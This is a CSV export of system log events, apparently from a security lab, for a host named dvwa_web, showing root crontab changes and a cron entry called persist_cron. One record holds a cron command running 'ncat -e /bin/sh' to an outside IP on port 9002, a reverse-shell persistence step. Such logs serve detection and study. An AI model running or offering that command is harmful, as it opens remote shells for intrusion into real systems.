@timestamp,agent.hostname,command,cwd,event.ingested,event.timezone,filename,host.hostname,host.id,host.ip,host.mac,host.os.codename,host.os.family,host.os.kernel,host.os.name,host.os.type,host.os.version,message,related.hosts,sid,tty,uid
"Oct 24, 2022 @ 23:25:20.574",dvwa_web,-,-,"Oct 24, 2022 @ 23:25:20.574",+08:00,-,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),dvwa_web crontab[311746]: (root) REPLACE (root),dvwa_web,-,-,-
"Oct 24, 2022 @ 23:25:20.574",dvwa_web,-,-,"Oct 24, 2022 @ 23:25:20.574",+08:00,-,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),dvwa_web crontab[311741]: (root) LIST (root),dvwa_web,-,-,-
"Oct 24, 2022 @ 23:25:20.574",dvwa_web,-,-,"Oct 24, 2022 @ 23:25:20.574",+08:00,-,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),dvwa_web crontab[311743]: (root) REPLACE (root),dvwa_web,-,-,-
"Oct 24, 2022 @ 23:25:20.574",dvwa_web,-,-,"Oct 24, 2022 @ 23:25:20.574",+08:00,-,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),dvwa_web crontab[311744]: (root) LIST (root),dvwa_web,-,-,-
"Oct 24, 2022 @ 23:25:20.574",dvwa_web,-,-,"Oct 24, 2022 @ 23:25:20.574",+08:00,-,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),dvwa_web CRON[311780]: (root) CMD (ncat -e /bin/sh 123.123.123.250 9002),dvwa_web,-,-,-
"Oct 24, 2022 @ 23:25:20.574",dvwa_web,-,-,"Oct 24, 2022 @ 23:25:20.574",+08:00,-,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),dvwa_web cron[303153]: (persist_cron) ORPHAN (no passwd entry),dvwa_web,-,-,-
